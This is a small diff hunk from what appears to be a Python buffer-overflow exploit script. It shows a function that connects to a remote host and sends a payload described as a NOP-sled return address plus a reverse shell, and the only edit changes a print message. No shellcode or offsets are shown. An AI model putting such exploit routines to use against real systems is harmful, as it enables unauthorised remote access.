@@ -152,7 +152,7 @@ def func_sendpayload(payload):
 		s.connect((rhost, rport))
 		#send payload with return addr to nopsled and reverse shell
 		s.send((payload + '\r\n'))
-		print "Sent payload!"
+		print "Sent payload! Shell please!"
 		if not s.recv(1024):	
 			print "No response..."
 		s.close()		
